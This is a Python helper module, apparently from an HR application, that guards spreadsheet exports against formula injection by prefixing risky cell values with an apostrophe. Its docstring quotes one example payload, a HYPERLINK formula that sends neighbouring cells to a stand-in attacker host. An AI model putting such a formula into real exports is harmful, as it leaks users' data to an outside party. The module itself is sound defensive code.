"""
Spreadsheet export safety helpers.

Excel and LibreOffice Calc evaluate any cell whose text begins with certain
characters, so a value carried through from user-entered data -- an employee
name, a leave description, a candidate's note -- can execute when the file is
opened. ``=HYPERLINK("http://attacker/?d="&A1, "x")`` will happily exfiltrate
neighbouring cells to a remote host, and the recipient of an HR export is
exactly the sort of person whose spreadsheet is worth reading.

This lives outside any one app because the codebase has four separate
spreadsheet writers (report/export.py, horilla_views/cbv_methods.py,
horilla_views/views.py, base/methods.py) and only the first one guarded its
cells. Rather than let each grow its own copy, they share this.
"""

from __future__ import annotations

from typing import Any

# A leading tab or carriage return can shift the payload past a naive check
# that only looks at the first character, so they are triggers too.
FORMULA_TRIGGERS: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r", "\n")

# U+2212 MINUS SIGN and the unicode dashes render like an ASCII hyphen but
# sit outside the tuple above; some importers normalize them before
# evaluating, so treat them as triggers as well.
UNICODE_MINUS_TRIGGERS: tuple[str, ...] = ("−", "–", "—")


def neutralize_formula(text: str) -> str:
    """Return ``text`` with a leading apostrophe when it could be a formula.

    The apostrophe forces literal text and is not itself displayed by the
    spreadsheet. Non-string and empty values are returned untouched.
    """
    if not isinstance(text, str) or not text:
        return text
    if text.startswith(FORMULA_TRIGGERS) or text.startswith(UNICODE_MINUS_TRIGGERS):
        return "'" + text
    return text


def safe_cell(value: Any) -> Any:
    """Guard a cell value, leaving real non-text types alone.

    Numbers, dates and booleans cannot carry a formula, and coercing them to
    text would lose their cell type (and any number formatting applied to the
    column), so they pass through unchanged.
    """
    if value is None:
        return ""
    if isinstance(value, bool) or isinstance(value, (int, float)):
        return value
    if isinstance(value, str):
        return neutralize_formula(value)
    return neutralize_formula(str(value))
